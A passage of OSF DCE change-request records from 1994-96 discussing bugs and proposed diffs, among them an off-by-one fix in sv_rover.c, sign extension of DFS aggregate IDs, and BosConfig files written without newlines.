length.

[3/03/95 public]

A testcase can be provided to further investigate the problem if needed.

[2/8/96 public]
Can you post the test case here? Does this still happen in 1.2.1? Should
the priority lowered from 0 to 2?



CR Number                     : 12796
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : dce_config prepends "/.:" to directory replicas
Reported Date                 : 2/13/95
Found in Baseline             : 1.1
Found Date                    : 2/13/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/13/95 public]

The dce_config script prepends a "/.:/" to directories which the user has
listed to replicate. The doc (Admin Guide - Intro) says that the user
should use "the full pathname (including the /.:/)". The result is that the
dce_config fails with the error:
         Enter the list of directories to be replicated, separated by spaces,
         and terminated by <RETURN>: 
 /.:/hosts 
 ERROR:   Failed to create replica /.://.:/hosts clearinghouse /.:/ra_ch

Solution: Don't prepend "/.:" to replicas (conform to documentation).
 
     *** /tmp/ci.21595..dce_config.21630.1      Wed Feb  1 16:12:32 1995
     --- /tmp/dce_config.21630.2        Wed Feb  1 16:12:33 1995
     ***************
     *** 6170,6180 ****
        log_msg VERBOSE "User entry: $LIST"
        for i in $LIST
        do
                log_msg VERBOSE "Replicating $i."
                log_msg DETAIL "Executing: cdscp create replica /.:/$i clearinghouse /.:/$newchname"
     !          cdscp create replica /.:/$i clearinghouse /.:/$newchname >/dev/null 2>&1
                if [ $? -ne 0 ]; then
                        err_exit "Failed to create replica /.:/$i clearinghouse /.:/$newchname"
                fi
        done
       }
     --- 5468,5478 ----
        log_msg VERBOSE "User entry: $LIST"
        for i in $LIST
        do
                log_msg VERBOSE "Replicating $i."
                log_msg DETAIL "Executing: cdscp create replica /.:/$i clearinghouse /.:/$newchname"
     !          cdscp create replica $i clearinghouse /.:/$newchname >/dev/null 2>&1
                if [ $? -ne 0 ]; then
                        err_exit "Failed to create replica /.:/$i clearinghouse /.:/$newchname"
                fi
        done
       }

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 12788
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : Logic mismatch between sec_clientd and dced
Reported Date                 : 1/30/95
Found in Baseline             : 1.1
Found Date                    : 1/30/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/30/95 public]
The grp_override functional test was failing with an unexpected 
status code.   I belive the following is the fix that's needed,
based on looking at the previous roverride_get_group_info() code.


diff -c sv_rover.c@@/main/mdf_MOTHRA_3/0 sv_rover.c
*** sv_rover.c@@/main/mdf_MOTHRA_3/0    Mon Jan 30 09:30:49 1995
--- sv_rover.c  Mon Jan 30 10:05:28 1995
***************
*** 8,13 ****
--- 8,18 ----
  /*
   * HISTORY
   * $Log:	c012788,v $
# Revision 1.3  96/10/08  14:40:52  root
# changed fields: Fixed In Baseline   new/changed/deleted note(s) [mariko 10/8/96 public]
# 
# Revision 1.2  95/08/15  15:14:23  root
# changed fields:  new/changed/deleted note(s) [karlz 08/15/95 public]
# 
# Revision 1.1  95/01/30  10:38:31  root
# new CR
# 
+  * Revision /main/mdf_MOTHRA_3/1  1995/01/30  15:09 UTC  mdf
+  *    Correction for CHFts14193.  When the roverride_get_group_info call was
+  *    moved from roverride.c to here, the functional test started failing 
+  *    due to the change in the logic when checking for number_members.
+  * 
   * Revision 1.1.2.9  1994/09/29  13:42:03  hasbrouc
   *    Fix group override support that broke when this code moved
   *    from roverride.c and was cleaned up
***************
*** 812,818 ****
        (*number_members)++;
      if (*number_members) {
        if (cursor->valid) {
!           if (cursor->handle > *number_members) {
                dce_lock_unlock(group_lock, st);
                *st = sec_rgy_no_more_entries;
                return;
--- 817,823 ----
        (*number_members)++;
      if (*number_members) {
        if (cursor->valid) {
!           if (cursor->handle >= *number_members) {
                dce_lock_unlock(group_lock, st);
                *st = sec_rgy_no_more_entries;
                return;

[08/15/95 public]

Isn't this a dup of 12786 ?

[10/8/96 public]

  Fix was submitted to 1.1 maintenance tree as the fix for OT12786



CR Number                     : 12786
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : sec_clientd
Short Description             : group override test fails
Reported Date                 : 1/27/95
Found in Baseline             : 1.1
Found Date                    : 1/27/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : dced/server/sv_rover.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/27/95 public]

                          DCE Problem Report
                  =================================


Submitter Information 
----------------------

Submitter Name:           rusman
Organization:             Hitachi Computer Products (America), Inc. 
Email Address:            osd.dce@hi.com rusman@hi.com 
Phone:                    617-890-0444 
DCE License Number:       1616-MDCE-92
Licensee's Defect Number: OSDqa10287


Hardware/Software Configuration
--------------------------------

Offering and Version:   DCEunk 
Component (Module):     dced/server/sv_rover.c 
Client Hardware:        see below 
Client Software:        see below 
Server Hardware:        see below 
Server Software:        see below 
Compiler:               n/a

Problem Description
--------------------

Severity Level: Severe

Date of First Occurrence: 01/03/95

One Line Description:
   OSDqa10287 group override test fails

Full Description:

Related-file::Modified 950103 by rusman:: Problem
 DESCRIPTION:
 
 The group override test fails reproducibly, as indicated in OSF's
 test results (OT 12676). We think we have a fix as follows (seems same
 as code in old sec_clientd...):
Related-file::Added 950103 by ddts:: /build/hiosfm/RCS/dce1.1/src/admin/dced/server/./sv_rover.c,v 7.5
 /build/hiosfm/RCS/dce1.1/src/admin/dced/server/./sv_rover.c,v 7.5
 rusman 1995/01/03 15:45:03 +10 -3
 Reason:  OSDqa10287 (new bug)
 fix boundary check causing test failure in group override tests
 
     *** /tmp/ci.12058..sv_rover.c.12093.1	Tue Jan  3 10:45:06 1995
     --- /tmp/sv_rover.c.12093.2	Tue Jan  3 10:45:06 1995
     ***************
     *** 18,27 ****
     --- 18,31 ----
        * src directory for the full copyright text.
        */
       /*
        * HISTORY
        * $Log:	c012786,v $
# Revision 1.2  96/10/08  14:35:14  root
# changed fields: Fixed In Baseline   new/changed/deleted note(s) [mariko 10/8/96 public]
# 
# Revision 1.1  95/01/27  15:20:02  root
# new CR
# 
     +  * Revision 7.5  1995/01/03  15:45:03  rusman
     +  * Reason:  OSDqa10287 (new bug)
     +  * fix boundary check causing test failure in group override tests
     +  *
        * Revision 7.4  1994/11/04  21:06:51  rusman
        * remove use of stat_r
        *
        * Revision 7.3  1994/11/03  23:05:59  warnick
        * Rolled in beta2 changes.
     ***************
     *** 828,838 ****
           /* Parse the members. */
           for (m = group->members; m != NULL; m = m->next)
       	(*number_members)++;
           if (*number_members) {
       	if (cursor->valid) {
     ! 	    if (cursor->handle > *number_members) {
       		dce_lock_unlock(group_lock, st);
       		*st = sec_rgy_no_more_entries;
       		return;
       	    }
       	    count = cursor->handle;
     --- 832,846 ----
           /* Parse the members. */
           for (m = group->members; m != NULL; m = m->next)
       	(*number_members)++;
           if (*number_members) {
       	if (cursor->valid) {
     ! #ifdef hitm
     ! 	    if (cursor->handle >= *number_members) { 
     ! #else
     ! 	    if (cursor->handle > *number_members) { 
     ! #endif
       		dce_lock_unlock(group_lock, st);
       		*st = sec_rgy_no_more_entries;
       		return;
       	    }
       	    count = cursor->handle;

[10/8/96 public]

  Fix was submitted to 1.1 maintenance tree.

./admin/dced/server/sv_rover.c
Comparing revision 1.1.2.9 with revision 1.1.6.1.
***************
*** 812,818 ****
        (*number_members)++;
      if (*number_members) {
        if (cursor->valid) {
!           if (cursor->handle > *number_members) {
                dce_lock_unlock(group_lock, st);
                *st = sec_rgy_no_more_entries;
                return;
--- 816,822 ----
        (*number_members)++;
      if (*number_members) {
        if (cursor->valid) {
!           if (cursor->handle >= *number_members) {    /* OT 12786 */
                dce_lock_unlock(group_lock, st);
                *st = sec_rgy_no_more_entries;
                return;



CR Number                     : 12785
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : security sams
Short Description             : missing arguments generate build warnings
Reported Date                 : 1/27/95
Found in Baseline             : 1.1
Found Date                    : 1/27/95
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/h/sad.sams
Sensitivity                   : public

[1/27/95 public]
During the build of security/h/sad.sams, two adjacent errors pop up:
 
Line 191: syntax error (ignored)
Line 192: syntax error (ignored)
 
Both are caused by the generation, in obj/*/security/dcesad.msg, of the
lines
 
184
185
 
... both of which lack text for their message.
 
Proposed solution: Change src/security/h/sad.sams to have the following
block replace the existing one -- the unused message contents are
*totally* up to you...
 
  start
  code            pwd_imp_err_DEL0
! text            "no message"
  explanation     "MESSAGE NOT REFERENCED, THEREFORE DELETED."
  action          "None required"
  end
 
  start
  code            pwd_imp_err_DEL1
! text            "no message"
  explanation     "MESSAGE NOT REFERENCED, THEREFORE DELETED."
  action          "None required"
  end

[12/21/95 public]
Build  "warnings", (especially useless ones like the above) don't warrant
a C2 rating.  Bumped it down to E4.

[2/8/96 public]
Actually, I just checked the build logs on rios and hp and I don't see
these messages...

Changed the platform and marked it enh.



CR Number                     : 12773
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : uuid
Short Description             : what is length of UUID string?
Reported Date                 : 1/9/95
Found in Baseline             : 1.1
Found Date                    : 1/9/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/9/95 public]
Something I found lying around from Aug 93.  
Forgive me if it's out of date. 
It would be nice if RPC provided some value which is the maximum
length of a UUID string.   There are several in use in some components
but none are public.  Command line apps (e.g., dcecp) could use this.

Below are the notes I made long ago:

  In acl_edit when getting the an extension type uuid (see
  security/client/admin/acl_edit/deif.c, function
  deif_get_extended_info) they consume all characters until a
  dot (the separator from the format labels).  Interesting
  that the comment says:
  
   *  where uuid_string is a fixed length ascii representation of
   *  an NCS 2.0 uuid
  
  In rpccp where uuids are entered by the user in profiles for
  example, they read everything that doesn't include a comma
  (the separator from the version numbers in an interface id):
  
          sscanf (opts[5].values[0], "%[^,],%hd.%hd",
                  interface_uuid,
                  &(interface_id.vers_major),
                  &(interface_id.vers_minor));
  
  rpccp.c:#define MAX_IF_ID_STRING_LENGTH         36 + 9 + 9 + 1
  uuidp.h:#define uuid_c_uuid_string_max          37

[01/09/95 public]
Well, it'd be a convenience, albeit marginal I think.   You can always
found it out by typing
	expr length `uuidgen`
at the shell (and add one for the trailing \0).  Oh yeah, it's 36 w/o \0.
This assumes uuidgen outputs AES-conformant uuid strings.

The differences between rpccp and acl_edit don't matter, since they're
two different programs with different input formats (one of the problems
dcecp solves).

[melman 1/9/95 public] 
The "expr length" trick only works with the default format of UUID.
For example, if you were writing a program that needed to ask a user
for input, how large a buffer would you need?  What if they entered an
old style UUID (version 1?)  Would it fit with all the .'s between the
address bytes?  What about future versions?

Anyway, I was thinking more for new apps than for dcecp.

[01/09/95 public]
Sorry my main point got lost in the cutesy-ness.

If a program wants a user to enter a uuid, it should either accept official
newstyle string formats (36 bytes of data), or its own format.  Adding
a constant equivalent to sizeof("397abfd4-2bee-11ce-a085-08000925634b")
(oops, there I go being clever again :-) is not very important.  Either
the programmer will know only a uuid is being handed around/entered here,
in which case they can count, or they'll have to know their own requirements.



CR Number                     : 12765
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : _DCE_PROTO_ should be defined
for C++
Reported Date                 : 12/7/94
Found in Baseline             : 1.1
Found Date                    : 12/7/94
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dce.h
Sensitivity                   : public

[12/7/94 public]
All the various copies of dce.h appear to define _DCE_PROTO_ only if
__STDC__ is defined.  In order for full function prototypes to be in
scope when including a DCE header file into a C++ module, _DCE_PROTO_
should also be defined whenever __cplusplus is defined.



CR Number                     : 12764
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Exceeding Maximum Aggregate ID in fts crfldbentry command is ungraceful
Reported Date                 : 12/7/94
Found in Baseline             : 1.0.3
Found Date                    : 7/5/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.

[12/7/94 public]

This is a minor problem we ran across -- it will probably affect only
64-bit implementations, but the fix will not harm 32-bit implementations.

----------------

When the maximum DFS numeric aggregate id value is exceeded when issuing
the 'fts crfldbentry' command, the error is not handled properly.  Although
an error message is generated, it appears that the fldb entry is created
anyway, with an aggregate id that is different than the one specified:

# fts crfldbentry test1 tub 4294967000
        readWrite   ID 0,,19  valid
        readOnly    ID 0,,20  invalid
        backup      ID 0,,21  invalid
number of sites: 1
   server           flags     aggr   siteAge principal      owner
fts: Number ('18446744073709551320') is too large!  Cannot use it.
Illegal aggregate Id (18446744073709551320): must be numeric!
Error in GetAggr: illegal aggregate (dfs / fts)
tub.zk3.dec.com     RW       18446744073709551320 0:00:00 hosts/tub
<nil>
FLDB entry created for fileset test1 (0,,19) on aggregate -296 of tub

# fts lsfldb test1
        readWrite   ID 0,,19  valid
        readOnly    ID 0,,20  invalid
        backup      ID 0,,21  invalid
number of sites: 1
   server           flags     aggr   siteAge principal      owner
fts: Number ('18446744073709551320') is too large!  Cannot use it.
Aggregate name 18446744073709551320 is not exported from the server
tub.zk3.dec.com     RW       18446744073709551320 0:00:00 hosts/tub
<nil>


The aggregate id should be checked in fts and the whole command should
immediately fail if the limit of (2^31 - 1) is exceeded.  I'm entering
this as a low priority for now, though the fix is likely trivial.

        Steve Strange  7/5/94


Answer for QAR #24832:
------ --- ------- -------
There was a problem in getAggrName() routine where we were using
"%lu" format in sprintf to convert an unsigned32 AggrId to a
character string. The sprintf was sign extending AggrId to a
64-bit value, and was causing subsequent errors. This problem
only showed up if the user specified AggrId's between 0x80000000
and 0xffffffff, i.e., with the highest order bit on.

The incorrect behavior has been fixed by using "%u" format
descriptor in sprintf call. Now, 'fts crfldbentry' will give
an error for aggrid values greater than 0xffffffff and will
accept 0x80000000 <= AggrId <= 0xffffffff.



CR Number                     : 12763
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : fts aggrinfo output format bad, and incorrect info
Reported Date                 : 12/6/94
Found in Baseline             : 1.0.3
Found Date                    : 7/5/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.

[12/6/94 public]
fts aggrinfo output format bad and incorrect info.
 
The formating of the fts aggrinfo command needs to be fixed.  When the name
of the aggr (filesystem mount point) is very long, it is getting truncated
and then appended with the block device name.  This  has been seen only for
the case of ufs thus far.
 
root@splash> fts aggrinfo -server splash
Non-LFS aggregate /dfs.root (/dev/rz1a): 15844 K free out of total 56915 (6324 
Non-LFS aggregate /usr/sandbox/disks/sb_disk1 (/dev/rz12c): 577437 K free out o
Non-LFS aggregate /usr/sandbox/disks/sb_disk2 (/dev/rz10c): 859843 K free out o
Non-LFS aggregate /usr/sandbox/disks/sb_disk8 (rz8#sandbox8): 737544 K free out
Non-LFS aggregate /usr/sandbox/disks/dfs.perf (rz8#dfs.perf): 737544 K free out
Non-LFS aggregate /project/dce/build/disks/dfs_dis/dev/rz11h (/dev/rz11h): 9554
Non-LFS aggregate /project/dce/build/disks/dfs_dis/dev/rz8d (/dev/rz8d): 49860 
Non-LFS aggregate /project/dce/build/disks/dfs_dis/dev/rz11g (/dev/rz11g): 1844
Non-LFS aggregate /home/cande (users#cande): 112008 K free out of total 402736 
Non-LFS aggregate /usr/users (/dev/rz3h): 9594 K free out of total 364928 (4054
Non-LFS aggregate /dfs.exported/rz2d (/dev/rz2d): 39134 K free out of total 868
Non-LFS aggregate /dfs.exported/rz2_fs1 (rz2#fs1): 115384 K free out of total 1
 
Notice the /project/dce/build/disks/dfs_dis entries.  They should be
dfs_disk0, dfs_disk1, and dfs_disk2 in that order replacing the dfs_dis/dev/*
portion of the name being shown.
 
Also look at rz11g, the  free space is way out of wack.  This is presumed to
be because there is actually no unreserved space left (file system > 100%
full) as can be seen from the following df...
 
df /project/dce/build/disks/*
Filesystem   512-blocks        Used       Avail Capacity  Mounted on
/dev/rz0a        126462       82946       30868    73%    /
/dev/rz11h      1438888     1103900      191098    85%    /project/dce/build/di
/dev/rz8d        743926      569812       99720    85%    /project/dce/build/di
/dev/rz11g       792926      720474           0   101%    /project/dce/build/di
 
-- Ed
 
Answer for QAR #24809:
------ --- ------- -------
Fixed code in userInt/fts/volc_main.c such that if
aggregate name is more than 31 characters, it is
truncated to 31 characters. This limit is imposed
by the size of the data structure. The incorrect
string was seen because the incomplete name was not
null-terminated.
 
Also fixed the code to print correct value for num
blocks availbale in case file system is full.
Code fix:
 
<  * Revision 1.2.2.12  1994/07/19  19:54:32  Seema_Peterson
<  *            Formatting error fixes for 'fts aggrinfo' command in
<  *            fts_DoAggregateInfo(). Reviewed by Steve Strange.
<  *    [1994/07/19  19:52:36  Seema_Peterson]
<  *
15c10
<  * 
---
>  *
507c502
<     int code = 0, i, j, numAggrs;
---
>     int code = 0, i, numAggrs;
523,536d517
<           /*
<            * Make sure the name is null terminated. If the underlying
<            * layers have a larger size for the name, we will have a
<            * partial non-null-terminated string here.
<            */
<           for (j=0; j < sizeof(aggrInfo.name); j++)
<               if (aggrInfo.name[j] == '\0')
<                   break;
<           if (j == sizeof(aggrInfo.name))
<               aggrInfo.name[j-1] = '\0';
< 
<           /* Check to see if the aggregate is full (or over-full) */
<           if ((int)(aggrInfo.curFree) <= 0)
<               aggrInfo.curFree = 0;
The body of the changes was placed immediately after the line that reads
 
	if (!code) {
 
in fts_DoAggregateInfo().
 
	Steve Strange, Digital Equipment Corp., 12/6/94

[12/7/94 public]
It's true that FTSERVER_AggregateInfo can return aggregate names and
device names that are not null-terminated.  It may be simpler to copy
these names into a one-character-bigger buffer and then zero the last
byte of that bigger buffer.  This will print the 32nd character, if there
is one.
 
I'm more concerned about the diagnosis and repair of the free-space value.
Perhaps DEC is using the percentage-based branch of the code in 
ag_ufsStat() in ufsops/ufs_agops.c; that branch seems to be wrong for
all platforms, yet was the default for any new port, so we pulled it
out.  In the version of the code that's in DCE 1.1, it looks like realFree
should be being computed as:
	availblks - (totalblks - nfree)
==	(totalblks - reserved) - (totalblks - nfree)
==	nfree - reserved
==	nfree - (nfree - available)
==	available
==	statb.f_bavail {straight from the VFS_STATFS call}
 
Assuming that f_bavail is the value to be printed (converting to 1K
units), I believe that the correct repair for this problem isn't to change
volc_main.c, but rather to repair ufs_agops.c.  The replacement of the code:
 
#if defined(AFS_VFS40) || defined(AFS_OSF_ENV) || defined(AFS_SUNOS5_ENV) || defined(AFS_HPUX_ENV)
    availblks = totalblks - reserved;
#else
    availblks = totalblks * (100 - reserved) / 100;
#endif
 
with
 
    availblks = totalblks - reserved;
 
was suggested in OT report 9703, which is currently a deferred enhancement.

[12/8/94 public]
Filled in Interest List CC with `cfe'



CR Number                     : 12761
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : DFS does not return ENOSPC
Reported Date                 : 12/6/94
Found in Baseline             : 1.0.2
Found Date                    : 3/30/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96  public]
lowering priority of old OTs that haven't appeared during R1.2.

[12/6/94 public]
 
DFS doesn't seem to return ENOSPC properly.  It allows writing to a
DFS-exported UFS file system past 100% capacity, all the way to 111% at
which point a file write will be incomplete, but no error will be
generated.  Some sort of space-reservation scheme probably needs to be
implemented in order to address this problem.
 
I have filed this OT as B (Critical) only because there really is no
workaround.  I wouldn't write this off as minor though, because it could
result in lost data without the application being aware of it.  Also, it's
important that when we do address this problem that it be done in a
consistent way across all vendor products.  
 
	Steve Strange, Digital Equipment Corp, 12/6/94

[12/6/94 public]
Transarc didn't fix this particular bug, either, but I have a comment and
a question.  The comment is that we did implement the CM feature where
storebacks that fail for ENOSPC reasons are retried for a while.  The
question is about the comment: 
      past 100% capacity, all the way to 111% at
   which point a file write will be incomplete, but no error will be
   generated.
I believed that the exporter call will fail, returning an ENOSPC error
or the like, and that this will be returned to the client either on a
write() call or on their close() call.  Is this not the case?

[12/7/94 public]
Or perhaps is the complaint that you'd want the write() to return an error
rather than the close()?



CR Number                     : 12746
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec/sams
Short Description             : need vendor-specific category
Reported Date                 : 11/10/94
Found in Baseline             : 1.1
Found Date                    : 11/10/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : sec.sams
Sensitivity                   : public

[11/10/94 public]
  Vendors are going to need unused, reserved error codes for certain
porting operations, in our case those errors generated by our
vendor-specific license management code. I'm lucky right now, as the
only uses I have for these codes do not go across wires and are not
returned by any API; hence, they can take on any (free) value from
release to release.
  How best to handle this with adequate foresight is an open problem.
Vendors using vendor-specific codes must either share their codes'
SAMS descriptions, or agree not to pass such codes over the wires or
through any other API accesses...
  For the immediate future, a sub-component "sec_s_vendor" with
several tens (64?) of reserved values would be a start. Or, should we
make it "sec_s_<vendor>" (that is, instantiate the vendor name eg
sec_s_transarc, sec_s_yoyodyne, sec_s_acme, etc.)?
  It may simplify things to keep in mind that even if vendors cannot
share their specific codes -- but are gauranteed reserved values for
theirs -- the worst a customer using a heterogenous cell could ever
see would be an untranslated code which could be looked-up on the
machine (server node) that sent it. Field support wouldn't be hindered
by this.

[11/10/94 public]
  That was my first CR for 1.1, and so now I've updated my baseline
defaults, sorry for the '1.0.3' mentioned in the initial edit of this
CR.
Changed Found in Baseline from `1.0.3' to `1.1' 
Changed Fix By Baseline from `1.1' to `1.2'



CR Number                     : 12745
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : 
Short Description             : BosConfig file is invalid
Reported Date                 : 11/10/94
Found in Baseline             : 1.1b24
Found Date                    : 11/10/94
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]

lowering priority of old OTs that haven't appeared during R1.2.

[11/10/94 public]
 
I checked with the dfs people here at IBM and they indicated that the
BosConfig file is not in the correct format. After I configure dfs,
the BosConfig file contains the following:
 
restarttime 11 0 4 0 0checkbintime 3 0 5 0 0bnode simple upserver 1parm /opt/dc
elocal/bin/upserver  -path /opt/dcelocal/var/dfs/admin.bos /opt/dcelocal/var/df
s/admin.fl  /opt/dcelocal/var/dfs/admin.ft  /opt/dcelocal/var/dfs/admin.up
/opt/dcelocal/var/dfs/admin.bak
end
bnode simple flserver 1parm /opt/dcelocal/bin/flserver
end
bnode simple bakserver 1parm /opt/dcelocal/bin/bakserver
end
bnode simple ftserver 1parm /opt/dcelocal/bin/ftserver
end
bnode simple repserver 1parm /opt/dcelocal/bin/repserver
end
If I run dfs.clean and thne try to restart dfs with this configuration
file, bosserver fails to start. The Bos Log file contains the following:
 
Thu Nov 10 09:48:37 1994: /opt/dcelocal/bin/bosserver: beginning logging
Thu Nov 10 09:48:38 1994: Server directory access is okay
Thu Nov 10 09:48:43 1994: /opt/dcelocal/bin/bosserver: can't open bosserver con
figuration file
I then changed the file to read:
 
restarttime 11 0 4 0 0
checkbintime 3 0 5 0 0
bnode simple upserver 1
parm /opt/dcelocal/bin/upserver  -path /opt/dcelocal/var/dfs/admin.bos  /opt/dc
elocal/var/dfs/admin.fl  /opt/dcelocal/var/dfs/admin.ft  /opt/dcelocal/var/dfs/
admin.up                 
/opt/dce
end
bnode simple flserver 1
parm /opt/dcelocal/bin/flserver
end
bnode simple bakserver 1
parm /opt/dcelocal/bin/bakserver
end
bnode simple ftserver 1
parm /opt/dcelocal/bin/ftserver
end
bnode simple repserver 1
parm /opt/dcelocal/bin/repserver
end
When I restarted bosserver, I was able to bring dfs up.

[11/10/94 public]
The fault is in whatever software you used to configure DFS, not in DFS
itself.

[11/11/94 public]
I don't understand that statement, bosserver creates the BosConfig file.
If that is the case then isn't the bosserver the software in question?

[11/11/94 public]
Oh, oops, it depends on how your configuration works.  Sorry; it's
possible to configure DFS by having the configuration tool write the
initial BosConfig file.
 
Looks like a fatal error in the OSF's "partial serviceability of DFS"
work, which lost the newlines that were supposed to be appended to the
printout.  It will affect more than just configuration, though, since
any time the bosserver configuration is changed, the BosConfig file
will be rewritten to be garbage.
 
Of course, the functionality tests would have caught this error, had
they been run.  Yuk.

[11/16/94 public]

[12/05/94 public]

In fact, I think the s12y changes went a little overboard.  There is no
reason to put syntactic keywords in the message catalog.  In this case,
"bnode", "restarttime", "checkbintime", "parm", etc. are keywords in the
BosConfig file.  The parsing code is looking for these exact strings.
There is no point in putting them into the BosConfig file from the message
catalog.  Thus, this code should just go back to the way it was, with
explicit printf's and sprintf's in the code and forget the s12y calls.

[12/07/94 public]

Here are diffs for bossvr_main.c and bss.sams to correct this problem:

********************************
<<< file 1: /vob/dce.src.file/src/file/bosserver/bss.sams@@/main/kissel_work/0
>>> file 2: bss.sams
********************************
-----[after 9 inserted 10-13]-----
> # Revision /main/kissel_work/1  1994/12/06  21:45 UTC  kissel
> # 	Eliminate the messages for BosConfig file syntactic keywords:  restarttime,
> # 	checkbintime, and bnode.  These are written and parsed by bossvr_main.c.
> # 
-----[deleted 210-238 after 213]-----
< end
< 
< start
< code           bss_s_bnode_name_type
< attributes     "svc_c_sev_notice | svc_c_action_brief"
< sub-component  bss_s_general
< text           "bnode %s %s %d"
< explanation    "?"
< action         " "
< end
< 
< start
< code           bss_s_restarttime
< attributes     "svc_c_sev_notice | svc_c_action_brief"
< sub-component  bss_s_general
< text           "restarttime %d %d %d %d %d"
< explanation    "?"
< action         " "
< notes          "Don't translate %d items."
< end
< 
< start
< code           bss_s_checkbintime
< attributes     "svc_c_sev_notice | svc_c_action_brief"
< sub-component  bss_s_general
< text           "checkbintime %d %d %d %d %d"
< explanation    "?"
< action         " "
< notes          "Don't translate %d items, please. (Ron)."

********************************
<<< file 1: /vob/dce.src.file/src/file/bosserver/bossvr_main.c@@/main/HPDCE02/kissel_work/0
>>> file 2: bossvr_main.c
********************************
-----[after 10 inserted 11-17]-----
>  * Revision /main/HPDCE02/kissel_work/1  1994/12/06  21:45 UTC  kissel
>  * 	Eliminate the s12y messages for BosConfig file syntactic keywords:  restarttime,
>  * 	checkbintime, and bnode.  They are parsed as explicit strings by other code
>  * 	in here, so there is no way they can be translated.  Besides, the current stuff
>  * 	is wrong because it does not put a newline on the end of the lines so the BosConfig
>  * 	file is hosed.
>  * 
-----[1104-1110 changed to 1111]-----
<      
<     {
<     char *dcesptr;
<     dcesptr = dce_sprintf(bss_s_bnode_name_type, abnode->type->name, abnode->name, abnode->fileGoal);
<     strcpy(tbuffer , dcesptr);
<     free(dcesptr);
<     }
---
>     sprintf(tbuffer, "bnode %s %s %d\n", abnode->type->name, abnode->name, abnode->fileGoal);
-----[1149-1151 changed to 1150]-----
<   {
<   char *dcesptr;
<   dcesptr = dce_sprintf(bss_s_restarttime, bossvr_nextRestartKT.mask,
---
>   sprintf(databuf, "restarttime %d %d %d %d %d\n", bossvr_nextRestartKT.mask,
-----[deleted 1154-1156 after 1152]-----
<   strcpy(databuf , dcesptr);
<   free(dcesptr);
<   }
-----[1159-1161 changed to 1155]-----
<   {
<   char *dcesptr;
<   dcesptr = dce_sprintf(bss_s_checkbintime, bossvr_nextDayKT.mask,
---
